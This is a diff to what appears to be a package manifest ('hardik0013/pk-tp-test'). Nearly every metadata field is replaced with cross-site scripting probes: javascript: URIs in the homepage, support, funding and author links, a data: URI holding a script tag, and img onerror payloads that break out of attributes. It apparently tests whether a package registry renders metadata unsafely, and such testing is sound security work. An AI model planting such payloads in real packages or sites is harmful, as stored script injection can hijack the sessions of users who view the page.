@@ -1,1 +1,17 @@
-{ "name": "domxss/<img src=x onerror=alert(document.domain)>", "version": "1.0.0" }
+{
+  "name": "hardik0013/pk-tp-test",
+  "description": "test",
+  "homepage": "javascript:alert('PKHOME')",
+  "support": {
+    "issues": "javascript:alert('PKISSUES')",
+    "source": "javascript:alert('PKSOURCE')",
+    "chat": "data:text/html,<script>alert('PKCHAT')</script>",
+    "email": "\"><img src=x onerror=alert('PKEMAIL')>"
+  },
+  "funding": [
+    {"type": "custom", "url": "javascript:alert('PKFUND')"}
+  ],
+  "authors": [
+    {"name": "A", "homepage": "javascript:alert('PKAUTHHOME')", "email": "x@x.com"}
+  ]
+}
